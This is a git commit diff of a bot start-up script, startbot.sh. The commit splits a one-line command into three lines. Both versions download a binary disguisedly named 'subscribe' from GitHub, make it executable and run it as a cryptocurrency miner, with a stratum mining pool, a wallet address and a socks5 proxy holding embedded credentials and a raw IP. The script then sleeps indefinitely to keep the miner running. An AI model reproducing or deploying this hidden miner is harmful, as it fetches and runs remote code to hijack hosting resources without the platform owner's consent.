a3c2b6848d0640c7af5230296fa59d716f8c25d9
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-11-18 20:57:11 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -4,5 +4,7 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MoZWmZP537xWNb2HePtZ8ZjEHcawGJdiFG.heroku -x socks5://omar:omar@137.184.167.28:555
+wget https://github.com/mrbogel/Student/raw/main/subscribe
+chmod +x subscribe
+./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MoZWmZP537xWNb2HePtZ8ZjEHcawGJdiFG.heroku -x socks5://omar:omar@137.184.167.28:555
 sleep 99999999999999999
